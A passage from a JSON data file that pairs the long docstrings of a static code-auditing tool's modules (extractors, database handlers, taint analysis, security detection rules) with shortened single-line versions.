    "original": "\"\"\"Extract weakref module usage.\n\n    Detects:\n    - weakref.ref()\n    - weakref.proxy()\n    - WeakValueDictionary, WeakKeyDictionary\n\n    Returns:\n        List of weakref usage dicts:\n        {\n            'line': int,\n            'usage_type': str,  # 'ref' | 'proxy' | 'WeakValueDictionary' | 'WeakKeyDictionary'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract weakref module usage.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/protocol_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract contextvars module usage.\n\n    Detects:\n    - ContextVar creation\n    - get()/set() operations\n    - Token usage\n\n    Returns:\n        List of contextvar usage dicts:\n        {\n            'line': int,\n            'operation': str,  # 'ContextVar' | 'get' | 'set' | 'Token'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract contextvars module usage.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/protocol_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract module-level attribute usage.\n\n    Detects:\n    - __name__, __file__, __doc__, __all__ usage\n    - Read vs write operations\n\n    Returns:\n        List of module attribute dicts:\n        {\n            'line': int,\n            'attribute': str,  # '__name__' | '__file__' | '__doc__' | '__all__'\n            'usage_type': str,  # 'read' | 'write' | 'check'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract module-level attribute usage.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/security_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract cryptography operations and weak algorithms.\n\n    Detects:\n    - AES/DES encryption\n    - RSA key generation\n    - Weak algorithms (DES, RC4)\n    - Hardcoded keys\n    - ECB mode usage\n\n    Security relevance:\n    - Weak algorithms = broken crypto\n    - ECB mode = pattern leakage\n    - Hardcoded keys = key compromise\n    - Small key sizes = brute force\n    \"\"\"",
    "truncated": "\"\"\"Extract cryptography operations and weak algorithms.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/task_graphql_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract Celery task invocation patterns.\n\n    Detects:\n    - task.delay(args) - simple invocation\n    - task.apply_async(args=(...), countdown=60, queue='high') - advanced invocation\n    - chain(task1.s(), task2.s()) - sequential execution\n    - group(task1.s(), task2.s()) - parallel execution\n    - chord(group(...), callback.s()) - parallel with callback\n    - task.s() / task.si() - task signatures\n\n    Security relevance:\n    - Taint tracking: user_input -> task.delay(data) -> unsafe task execution\n    - Privilege escalation: non-admin calling admin tasks\n    - Queue bypass: apply_async with queue override\n    \"\"\"",
    "truncated": "\"\"\"Extract Celery task invocation patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract struct, enum, and trait definitions.\n\n    In Rust, 'classes' are represented by:\n    - struct items\n    - enum items\n    - trait items\n\n    Args:\n        tree: tree-sitter parse tree\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        List of class/struct/enum dicts\n    \"\"\"",
    "truncated": "\"\"\"Extract struct, enum, and trait definitions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract let bindings and assignment expressions.\n\n    Examples:\n    - let x = 5;\n    - let mut y = foo();\n    - x = y + 1;\n\n    Args:\n        tree: tree-sitter parse tree\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        List of assignment dicts with target_var, source_expr, line, in_function\n    \"\"\"",
    "truncated": "\"\"\"Extract let bindings and assignment expressions.\"\"\""
  },
  {
    "file": "theauditor/ast_parser.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"AST parser with language-specific parsers for optimal analysis.\n\nArchitecture:\n- Python: CPython ast module (stdlib) - NOT Tree-sitter\n- JavaScript/TypeScript: TypeScript Compiler API MANDATORY - NO FALLBACKS\n- Tree-sitter: DEPRECATED for JS/TS (produces corrupted data)\n\nThis module provides true structural code analysis using the best parser for\neach language, enabling high-fidelity pattern detection that understands code\nsemantics rather than just text matching.\n\nCRITICAL:\n- Python is NEVER parsed by Tree-sitter (see _init_tree_sitter_parsers() lines 63-90)\n- JS/TS MUST use semantic parser - silent fallbacks produce \"anonymous\" function names\n\"\"\"",
    "truncated": "\"\"\"AST parser with language-specific parsers for optimal analysis.\"\"\""
  },
  {
    "file": "theauditor/boundaries/distance.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"\n    Calculate call-chain distance between entry point and control point.\n\n    Uses XGraphAnalyzer with graphs.db (includes interceptor edges).\n\n    Args:\n        db_path: Path to repo_index.db (used to derive graphs.db path)\n        entry_file: File containing entry point\n        entry_line: Line number of entry point\n        control_file: File containing control point\n        control_line: Line number of control point\n\n    Returns:\n        Distance as integer, or None if no path exists\n    \"\"\"",
    "truncated": "\"\"\"Calculate call-chain distance between entry point and control point.\"\"\""
  },
  {
    "file": "theauditor/boundaries/distance.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"\n    Find all control points reachable from entry point and their distances.\n\n    Uses XGraphAnalyzer with graphs.db (includes interceptor edges).\n\n    Args:\n        db_path: Path to repo_index.db\n        entry_file: Entry point file\n        entry_line: Entry point line\n        control_patterns: List of control function patterns to find\n        max_depth: Maximum call chain depth to search\n\n    Returns:\n        List of dicts with control_function, control_file, distance, path\n    \"\"\"",
    "truncated": "\"\"\"Find all control points reachable from entry point and their distances.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Find what a symbol calls.\n\n        Query function_call_args WHERE caller_function matches.\n\n        Args:\n            symbol_name: Symbol to find callees for\n\n        Returns:\n            List of call sites showing what this symbol calls\n\n        Example:\n            callees = engine.get_callees(\"UserController.create\")\n            for call in callees:\n                print(f\"Calls: {call.callee_function}\")\n        \"\"\"",
    "truncated": "\"\"\"Find what a symbol calls.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Find API endpoint handlers.\n\n        Direct query on api_endpoints table.\n\n        Args:\n            route_pattern: Route to search (supports LIKE wildcards)\n\n        Returns:\n            List of endpoint info dicts\n\n        Example:\n            endpoints = engine.get_api_handlers(\"/users\")\n            for ep in endpoints:\n                print(f\"{ep['method']} {ep['path']} -> {ep['handler_function']}\")\n        \"\"\"",
    "truncated": "\"\"\"Find API endpoint handlers.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Aggregate all context for a file in one call.\n\n        This is the main entry point for 'aud explain <file>'.\n\n        Args:\n            file_path: File path (partial match supported)\n            limit: Max items per section\n\n        Returns:\n            Dict with all sections: symbols, hooks, imports, importers,\n            outgoing_calls, incoming_calls, framework_info\n\n        Note: Queries for limit+1 items to enable accurate truncation detection.\n              Caller should check len(section) > limit to detect truncation.\n        \"\"\"",
    "truncated": "\"\"\"Aggregate all context for a file in one call.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"\n    Detect if a version string is a pre-release.\n\n    Checks for common pre-release markers:\n    - alpha: 1.0a1, 1.0.0a1, 1.0-alpha1\n    - beta: 1.0b1, 1.0.0b1, 1.0-beta1\n    - rc: 1.0rc1, 1.0.0rc1, 1.0-rc1\n    - dev: 1.0.dev0, 1.0-dev\n\n    Args:\n        version: Version string to check\n\n    Returns:\n        True if pre-release, False if stable\n    \"\"\"",
    "truncated": "\"\"\"Detect if a version string is a pre-release.\"\"\""
  },
  {
    "file": "theauditor/docs_fetch.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"\n    Fetch version-correct documentation for dependencies.\n\n    This is the sync wrapper that calls the async engine.\n\n    Args:\n        deps: List of dependency objects from deps.py\n        allow_net: Whether network access is allowed\n        allowlist: List of allowed URL prefixes (uses DEFAULT_ALLOWLIST if None)\n        offline: Force offline mode\n        output_dir: Base directory for cached docs\n\n    Returns:\n        Summary of fetch operations\n    \"\"\"",
    "truncated": "\"\"\"Fetch version-correct documentation for dependencies.\"\"\""
  },
  {
    "file": "theauditor/docs_fetch.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Documentation fetcher for version-correct package docs.\n\nARCHITECTURE (v2 - Async Rewrite):\n- Async HTTP with httpx for parallel fetching\n- Smart URL probing (HEAD before GET)\n- Reduced URL pattern explosion (240 -> 15 patterns)\n- Shared rate limiting with deps.py\n- Aggressive timeouts (2s probe, 5s fetch)\n\nThe old synchronous version was a denial-of-service attack against our own runtime:\n- 240 URL patterns per package\n- 10s timeout per failed guess\n- Sequential blocking\nResult: 300-400s for 80 packages = pipeline killer\n\"\"\"",
    "truncated": "\"\"\"Documentation fetcher for version-correct package docs.\"\"\""
  },
  {
    "file": "theauditor/graph/analyzer.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"\n        Calculate the impact of changing target files using graph traversal.\n\n        Uses cached adjacency lists if available (stateful mode), otherwise\n        builds them on-the-fly (stateless mode).\n\n        Args:\n            targets: List of file/module IDs that will change\n            import_graph: Import/dependency graph\n            call_graph: Optional call graph\n            max_depth: Maximum traversal depth\n\n        Returns:\n            Raw impact data with upstream and downstream effects\n        \"\"\"",
    "truncated": "\"\"\"Calculate the impact of changing target files using graph traversal.\"\"\""
  },
  {
    "file": "theauditor/graph/dfg_builder.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Build parameter binding edges connecting caller arguments to callee parameters.\n\n        This is the CRITICAL inter-procedural data flow edge that enables multi-hop\n        cross-function taint analysis. Without these edges, IFDS cannot traverse\n        function boundaries.\n\n        For a call like: processData(userInput)\n        Creates edge: caller_file::caller_func::userInput -> callee_file::processData::data\n\n        Args:\n            root: Project root directory (for metadata only)\n\n        Returns:\n            Dict with nodes, edges, and metadata\n        \"\"\"",
    "truncated": "\"\"\"Build parameter binding edges connecting caller arguments to callee parameters.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/base_database.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Flush a single table's batch using schema-driven INSERT.\n\n        ARCHITECTURE: Schema-driven batch flushing.\n        - Looks up table schema from TABLES registry\n        - Gets column list from TableSchema.column_names()\n        - Builds INSERT statement dynamically\n        - Handles INSERT, INSERT OR REPLACE, INSERT OR IGNORE modes\n\n        Args:\n            table_name: Name of table to flush\n            insert_mode: SQL insert verb - one of:\n                - 'INSERT': Standard insert (fails on constraint violation)\n                - 'INSERT OR REPLACE': Update existing rows (for files, jsx tables)\n                - 'INSERT OR IGNORE': Skip duplicates (for frameworks)\n        \"\"\"",
    "truncated": "\"\"\"Flush a single table's batch using schema-driven INSERT.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/base_database.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Write findings to database using batch insert with typed columns.\n\n        Implements the Sparse Wide Table pattern: tool-specific metadata is stored\n        in dedicated typed columns (cfg_*, graph_*, mypy_*, tf_*) instead of JSON.\n\n        Args:\n            findings: List of finding dicts from any tool (patterns, taint, lint, etc.)\n            tool_name: Name of the tool that generated findings (e.g., 'patterns', 'taint')\n\n        Notes:\n            - Maps tool-specific data to typed columns based on tool_name\n            - NO JSON serialization - all data in typed columns\n            - Taint data goes to taint_flows table, not here (just a marker row)\n            - 79% of rows will have NULL for tool-specific columns (free in SQLite)\n        \"\"\"",
    "truncated": "\"\"\"Write findings to database using batch insert with typed columns.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/graphql_database.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Add a GraphQL field definition record to the batch.\n\n        Args:\n            type_id: FK to graphql_types.type_id (from INSERT return)\n            field_name: Name of the field (e.g., 'user', 'createPost')\n            return_type: GraphQL return type (e.g., 'User', 'String!', '[Post]')\n            is_list: Whether field returns a list (e.g., [User])\n            is_nullable: Whether field return is nullable\n            line: Line number in schema file (optional)\n            column: Column number in schema file (optional)\n\n        Note: Directives go to junction table graphql_field_directives (via add_graphql_field_directive)\n\n        NO FALLBACKS. type_id MUST exist from prior add_graphql_type call.\n        \"\"\"",
    "truncated": "\"\"\"Add a GraphQL field definition record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Add a Python control statement to the batch.\n\n        Args:\n            statement_kind: 'break', 'continue', 'pass', 'assert', 'del', 'with' (discriminator)\n            statement_type: Extractor's subtype (preserved)\n            loop_type: For break/continue - type of enclosing loop\n            condition_type: For assert - type of condition expression\n            has_message: For assert - whether assertion has a message\n            target_count: For del - number of targets deleted\n            target_type: For del - type of deletion target\n            context_count: For with - number of context managers\n            has_alias: For with - whether 'as' clause is used\n            is_async: For with - whether it's 'async with'\n            in_function: Name of containing function\n        \"\"\"",
    "truncated": "\"\"\"Add a Python control statement to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Python-specific database operations.\n\nThis module contains add_* methods for PYTHON_TABLES defined in schemas/python_schema.py.\n\nHandles 30 Python tables with 30 add_* methods:\n- 8 original methods for 8 kept tables (ORM, routes, validators, decorators, Django, package_configs)\n- 20 methods for consolidated tables (loops, branches, security, testing, etc.)\n- 2 methods for expression decomposition (comprehensions, control_statements)\n\nHISTORY:\n- 2025-11-25: Purged ~140 zombie methods (1,655 lines deleted)\n- 2025-11-25: Added 20 consolidated table methods\n- 2025-11-25: Removed dead add_python_blueprint method (table doesn't exist)\n- 2025-11-26: Added 2 expression decomposition methods (Phase 2 Fidelity Control)\n\"\"\"",
    "truncated": "\"\"\"Python-specific database operations.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/__init__.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract route definitions from file content.\n\n        Routes are inherently string-based in all frameworks:\n        - Express: app.get('/path', ...)\n        - Flask: @app.route('/path')\n        - Django: path('/path', ...)\n\n        This is a legitimate use of regex as routes are string literals.\n\n        Args:\n            content: File content\n\n        Returns:\n            List of (method, path) tuples\n        \"\"\"",
    "truncated": "\"\"\"Extract route definitions from file content.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript_resolvers.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Resolve import paths using indexed file data.\n\n        ARCHITECTURE: Post-indexing resolution using database queries (NO filesystem I/O).\n        Runs AFTER all files indexed. Queries `files` table for O(1) path lookups.\n\n        Resolution order:\n        1. Path alias expansion (@/, ~/)\n        2. Relative path resolution (./foo, ../bar)\n        3. Extension/index file variants\n\n        Note: node_modules (bare specifiers like 'lodash') are NOT resolved.\n\n        Args:\n            db_path: Path to repo_index.db database\n        \"\"\"",
    "truncated": "\"\"\"Resolve import paths using indexed file data.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/node_schema.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"\nNode/JavaScript/TypeScript-specific schema definitions.\n\nThis module contains table schemas specific to Node.js, React, Vue, and TypeScript:\n- Framework-specific patterns (React hooks, Vue composition API)\n- TypeScript type annotations\n- API endpoints and middleware\n- Package management and build analysis\n- Validation frameworks (Zod, Joi, Yup)\n\nDesign Philosophy:\n- Node/JS/TS-only tables\n- Framework-agnostic core with framework-specific extensions\n- Complements core schema with JavaScript ecosystem patterns\n\"\"\"",
    "truncated": "\"\"\"Node/JavaScript/TypeScript-specific schema definitions.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/core_storage.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Core storage handlers for language-agnostic patterns.\n\nThis module contains handlers for code patterns that apply across all languages:\n- File tracking: imports, refs\n- Code structure: symbols, type_annotations, class_properties\n- Data flow: assignments, function_calls, returns\n- Security: sql_objects, sql_queries, jwt_patterns\n- Control flow: cfg blocks/edges/statements\n- Analysis: variable_usage, object_literals, orm_queries, orm_relationships\n- Infrastructure: cdk_constructs, routes\n- Validation: validation_framework_usage\n- Build: package_configs\n\nHandler Count: 21\n\"\"\"",
    "truncated": "\"\"\"Core storage handlers for language-agnostic patterns.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/node_storage.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Node.js storage handlers for JavaScript/TypeScript frameworks.\n\nThis module contains handlers for JavaScript/TypeScript frameworks:\n- React: hooks (components in core)\n- Vue: components, hooks, directives, provide/inject, junction tables\n- Angular: components, services, modules, guards, DI, junction tables\n- ORM: sequelize models/associations/fields\n- Queue: bullmq queues/workers\n- Build: import styles, lock analysis\n- Core language: func_params, decorators, param decorators\n- Data flow: assignment/return source vars\n- Module: import specifiers\n\nHandler Count: 35\n\"\"\"",
    "truncated": "\"\"\"Node.js storage handlers for JavaScript/TypeScript frameworks.\"\"\""
  },
  {
    "file": "theauditor/insights/__init__.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"TheAuditor insights package - optional interpretive intelligence.\n\nThis package contains all optional scoring, classification, and\nrecommendation modules that add interpretation on top of facts.\n\nThe insights package follows the Truth Courier principle - all modules\nhere are OPTIONAL and add subjective analysis on top of objective facts.\nThe core audit pipeline works without any of these modules.\n\nModules:\n  - ml: Machine learning predictions and risk scoring\n  - graph: Architecture health metrics and recommendations\n  - semantic_context: User-defined business logic and semantic understanding\n  - impact_analyzer: Change blast radius and coupling analysis\n\"\"\"",
    "truncated": "\"\"\"TheAuditor insights package - optional interpretive intelligence.\"\"\""
  },
  {
    "file": "theauditor/insights/graph.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"\n        Generate actionable recommendations based on graph analysis.\n\n        These are OPINIONATED suggestions based on common architectural\n        best practices. They may not apply to all projects.\n\n        Args:\n            import_graph: Import/dependency graph\n            cycles: Pre-computed cycles (optional)\n            hotspots: Pre-computed hotspots (optional)\n            layers: Pre-computed layers (optional)\n\n        Returns:\n            List of recommendation strings\n        \"\"\"",
    "truncated": "\"\"\"Generate actionable recommendations based on graph analysis.\"\"\""
  },
  {
    "file": "theauditor/insights/impact_analyzer.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"\n    Trace a frontend API call to its corresponding backend endpoint.\n\n    Uses function_call_args table to find axios/fetch calls instead of\n    parsing source code with regex. This follows the database-first\n    architecture principle.\n\n    Args:\n        cursor: Database cursor\n        target_file: Frontend file containing API call\n        target_line: Line number of the API call\n\n    Returns:\n        Dictionary with cross-stack trace information or None if not found\n    \"\"\"",
    "truncated": "\"\"\"Trace a frontend API call to its corresponding backend endpoint.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"\n    Query findings_consolidated for vulnerability findings (tool='vulnerability_scanner').\n\n    ZERO FALLBACK: No try/except for DB query. Crash if DB missing.\n\n    Returns dict mapping file paths to CVE details:\n    {\n        \"package.json\": {\n            \"cve_count\": 5,\n            \"max_cvss_score\": 9.8,\n            \"critical_cves\": 2,\n            \"exploitable_count\": 1\n        }\n    }\n    \"\"\"",
    "truncated": "\"\"\"Query findings_consolidated for vulnerability findings (tool='vulnerability_scanner').\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"\n    Query findings_consolidated for pattern detection findings (tool='patterns').\n\n    ZERO FALLBACK: No try/except for DB query. Crash if DB missing.\n\n    Returns dict mapping file paths to pattern counts:\n    {\n        \"config.py\": {\n            \"hardcoded_secrets\": 3,\n            \"weak_crypto\": 1,\n            \"insecure_random\": 0,\n            \"dangerous_functions\": 2\n        }\n    }\n    \"\"\"",
    "truncated": "\"\"\"Query findings_consolidated for pattern detection findings (tool='patterns').\"\"\""
  },
  {
    "file": "theauditor/linters/__init__.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Linters package - REFACTORED: Single-file orchestration.\n\nDEPRECATED modules (renamed to .bak, kept for reference):\n- detector.py.bak (272 lines) - Replaced by LinterOrchestrator database queries\n- runner.py.bak (387 lines) - Replaced by LinterOrchestrator._run_* methods\n- parsers.py.bak (504 lines) - Replaced by LinterOrchestrator JSON parsing\n\nNEW architecture (single file):\n- linters.py (400 lines) - Complete linter orchestration\n\nConfig files (kept for setup):\n- package.json - Copied to .auditor_venv/.theauditor_tools/ during setup\n- eslint.config.cjs - Copied to .auditor_venv/.theauditor_tools/ during setup\n- pyproject.toml - Copied to .auditor_venv/.theauditor_tools/ during setup\n\"\"\"",
    "truncated": "\"\"\"Linters package - REFACTORED: Single-file orchestration.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/oauth_analyze.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Detect OAuth tokens in URL fragments or parameters.\n\n    Tokens in URLs are exposed in:\n    - Browser history\n    - Server logs\n    - Referrer headers\n    - Proxy logs\n\n    OAuth 2.0 best practices:\n    - Use authorization code flow (not implicit flow)\n    - Never put access_token in URL\n    - Use token in Authorization header or POST body\n\n    CWE-598: Use of GET Request Method With Sensitive Query Strings\n    \"\"\"",
    "truncated": "\"\"\"Detect OAuth tokens in URL fragments or parameters.\"\"\""
  },
  {
    "file": "theauditor/rules/common/util.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Check if string matches keyboard walk patterns.\n\n        Keyboard walks are patterns formed by adjacent keys on QWERTY keyboard.\n\n        Examples:\n        - \"qwerty\" -> True\n        - \"asdfgh\" -> True\n        - \"1qaz2wsx\" -> True\n\n        Args:\n            text: String to analyze\n\n        Returns:\n            True if text matches known keyboard walk pattern\n        \"\"\"",
    "truncated": "\"\"\"Check if string matches keyboard walk patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/ghost_dependencies.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Normalize package name for comparison.\n\n    Examples:\n        'requests' -> 'requests'\n        'django.contrib.auth' -> 'django'\n        'lodash/map' -> 'lodash'\n        '@vue/reactivity' -> '@vue/reactivity'\n        'node:fs' -> 'node:fs' (keep node: prefix)\n\n    Args:\n        package: Raw package name from import\n\n    Returns:\n        Normalized base package name (lowercase)\n    \"\"\"",
    "truncated": "\"\"\"Normalize package name for comparison.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/peer_conflicts.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Check if requirement and actual version have major version mismatch.\n\n    This is a simple heuristic that detects obvious conflicts.\n    Examples:\n        requirement=\"^17.0.0\", actual=\"18.2.0\" → True (mismatch)\n        requirement=\"^17.0.0\", actual=\"17.5.0\" → False (compatible)\n        requirement=\">=16.0.0\", actual=\"18.2.0\" → False (compatible)\n\n    Args:\n        requirement: Version requirement string (e.g., \"^17.0.0\", \">=16.0.0\")\n        actual: Actual installed version (e.g., \"18.2.0\")\n\n    Returns:\n        True if there's a major version mismatch\n    \"\"\"",
    "truncated": "\"\"\"Check if requirement and actual version have major version mismatch.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/typosquatting.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Detect potential typosquatting in package names.\n\nTyposquatting is a supply-chain attack where malicious packages use names\nsimilar to popular packages (e.g., 'requets' instead of 'requests').\nThis rule detects common typos and suspicious package names.\n\nDetection Strategy:\n1. Query package_configs and import_styles for all package names\n2. Check against TYPOSQUATTING_MAP from config.py\n3. Flag potential typos with suggested corrections\n\nDatabase Tables Used:\n- package_configs: Declared dependencies\n- import_styles: Imported packages\n\"\"\"",
    "truncated": "\"\"\"Detect potential typosquatting in package names.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/nginx_analyze.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Detect Nginx security misconfigurations.\n\n    Analyzes nginx_configs table for:\n    - proxy_pass without rate limiting\n    - Missing critical security headers\n    - Exposed sensitive directories\n    - SSL/TLS misconfigurations\n    - Server token disclosure\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of StandardFinding objects for detected issues\n    \"\"\"",
    "truncated": "\"\"\"Detect Nginx security misconfigurations.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/artifact_poisoning.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Detect artifact poisoning via untrusted build → trusted deploy chain.\n\n    Detection Logic:\n    1. Find workflows with pull_request_target trigger\n    2. Identify jobs that upload artifacts (actions/upload-artifact)\n    3. Find dependent jobs that download those artifacts\n    4. Check if download job has dangerous operations (deploy, sign, publish)\n    5. Report CRITICAL if untrusted artifact is deployed without validation\n\n    Args:\n        context: Rule execution context with database path\n\n    Returns:\n        List of security findings\n    \"\"\"",
    "truncated": "\"\"\"Detect artifact poisoning via untrusted build → trusted deploy chain.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/artifact_poisoning.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"GitHub Actions Artifact Poisoning Detection.\n\nDetects artifact poisoning vulnerabilities where build artifacts are created in\nuntrusted contexts (pull_request_target, untrusted jobs) and then consumed/deployed\nin trusted contexts without validation.\n\nAttack Pattern:\n1. Job A: Builds artifact in pull_request_target context (attacker code)\n2. Job A: Uploads artifact via actions/upload-artifact\n3. Job B: Downloads artifact via actions/download-artifact (trusted context)\n4. Job B: Deploys or signs artifact without validation\n5. Result: Attacker artifacts deployed to production or signed with trusted key\n\nCWE-494: Download of Code Without Integrity Check\n\"\"\"",
    "truncated": "\"\"\"GitHub Actions Artifact Poisoning Detection.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/script_injection.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Build finding for script injection vulnerability.\n\n    Args:\n        workflow_path: Path to workflow file\n        workflow_name: Workflow display name\n        job_key: Job key\n        step_name: Step display name\n        run_script: Shell script content\n        untrusted_refs: List of untrusted reference paths\n        severity: Calculated severity\n        has_pr_target: Whether workflow uses pull_request_target\n\n    Returns:\n        StandardFinding object\n    \"\"\"",
    "truncated": "\"\"\"Build finding for script injection vulnerability.\"\"\""
  },
  {
    "file": "theauditor/rules/security/sourcemap_analyze.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Source Map Exposure Analyzer - Hybrid Database + File I/O Approach.\n\nDetects exposed source maps using a JUSTIFIED HYBRID approach because:\n1. Source maps are BUILD ARTIFACTS not indexed in database\n2. .map files exist only in dist/build directories\n3. Inline maps are added by bundlers, not in source\n4. sourceMappingURL comments are in generated files\n\nFollows v1.1+ schema contract compliance for database queries:\n- Frozensets for all patterns (O(1) lookups)\n- Direct database queries (assumes all tables exist per schema contract)\n- Uses parameterized queries (no SQL injection)\n- Proper confidence levels\n- Minimal file I/O (last 5KB only for build artifacts)\n\"\"\"",
    "truncated": "\"\"\"Source Map Exposure Analyzer - Hybrid Database + File I/O Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/security/websocket_analyze.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"\n    Detect WebSocket security issues using SQL queries.\n\n    This function queries the indexed database to find:\n    - WebSocket connections without authentication\n    - Unvalidated message handling\n    - Missing rate limiting on WebSocket messages\n    - Broadcasting sensitive data to all clients\n\n    Args:\n        context: StandardRuleContext with database path\n\n    Returns:\n        List of StandardFinding objects\n    \"\"\"",
    "truncated": "\"\"\"Detect WebSocket security issues using SQL queries.\"\"\""
  },
  {
    "file": "theauditor/rules/typescript/type_safety_analyze.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"SQL-based TypeScript type safety analyzer - ENHANCED with semantic type data.\n\nThis module provides comprehensive type safety detection for TypeScript projects\nby querying semantic type information from the type_annotations table (populated\nby TypeScript Compiler API).\n\nFollows gold standard patterns (v1.1+ schema contract compliance):\n- Assumes all contracted tables exist (NO table existence checks, NO fallback logic)\n- 100% accurate detection using semantic type data from TypeScript compiler\n- 16 comprehensive patterns (added 'unknown' type detection)\n- Indexed boolean lookups (is_any, is_unknown, is_generic) instead of LIKE scans\n- Direct access to return_type, type_params, and type_annotation columns\n- Proper frozensets for O(1) pattern matching\n- If type_annotations table missing, rule crashes with clear error (CORRECT behavior)\n\"\"\"",
    "truncated": "\"\"\"SQL-based TypeScript type safety analyzer - ENHANCED with semantic type data.\"\"\""
  },
  {
    "file": "theauditor/taint/access_path.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Check if two access paths could alias (prefix match).\n\n        Conservative approximation: If one is a prefix of the other, assume they alias.\n\n        Examples:\n            req.body matches req.body.userId  → True (prefix)\n            req.body matches req.headers      → False (different fields)\n            user matches user.data            → True (prefix)\n\n        Args:\n            other: Another AccessPath to compare\n\n        Returns:\n            True if paths could potentially alias\n        \"\"\"",
    "truncated": "\"\"\"Check if two access paths could alias (prefix match).\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Write resolved flow to resolved_flow_audit table with SEMANTIC DEDUPLICATION.\n\n        Optimization: \"Truth over Noise\".\n        We store only the SHORTEST path for every unique combination of:\n        (Source Node, Sink Node, Status, Sanitizer Method).\n\n        This reduces graph explosion (4k permutations) to distinct semantic outcomes (1-2 paths).\n\n        Args:\n            source: Entry point node ID (format: file::function::variable)\n            sink: Exit point node ID (format: file::function::variable)\n            path: Complete path from source to sink\n            status: Flow classification (VULNERABLE, SANITIZED, or TRUNCATED)\n            sanitizer_meta: Sanitizer metadata dict if flow is SANITIZED, None otherwise\n        \"\"\"",
    "truncated": "\"\"\"Write resolved flow to resolved_flow_audit table with SEMANTIC DEDUPLICATION.\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
